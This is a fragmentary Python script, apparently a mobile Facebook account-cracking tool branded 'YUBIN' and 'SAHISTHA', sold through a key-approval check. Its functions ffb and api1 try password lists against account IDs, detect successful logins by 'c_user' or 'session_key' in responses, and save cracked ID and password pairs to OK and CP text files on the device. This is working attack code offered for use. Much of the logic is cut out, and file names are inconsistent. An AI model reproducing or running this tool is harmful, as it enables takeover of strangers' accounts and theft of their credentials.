...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/YUBIN-XD/Private/blob/main/SAHISTHA.txt").text
    if id in httpCaht:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public_mai()                      
                                ...
                                os.system(f'xdg-open https://www.facebook.com/yubinxwd');menu()
                                ...
                                if cpok in ['1','01']:
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/YUBIN-OK.txt', 'a')
                                    animation(' >> Opening SAHISTHA-OK.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/SAHISTHA-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/SAHISTHA-CP.txt', 'a')
                                    animation(' >> Opening SAHISTHA-CP.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/SAHISTHA-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                                        animation('\u001b[33m'+cpid);
                                        cpids.close()
                                    print('\033[1;37m----------------------------------------------')
                        ...
                        tks = ("Hi YUBIN Sir, I Need To Buy Your Paid YUBIN PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [SAHISTHA-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in HARRY:
                                ...
                                print('\r\r\033[1;32m [SAHISTHA-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\u001b[33m [SAHISTHA-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/YUBIN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [SAHISTHA-OK] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/SAHISTHA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/SAHIATHA-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m [YUBIN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print('\r\r\u001b[33m [SORRY-CP] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/SAHISTHA-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [SAHISTHA-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/YUBIN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                ...
                                                print('\r\r\033[1;32m [YUBIN-OK] '+uid+' | '+pas+'\033[1;97m')
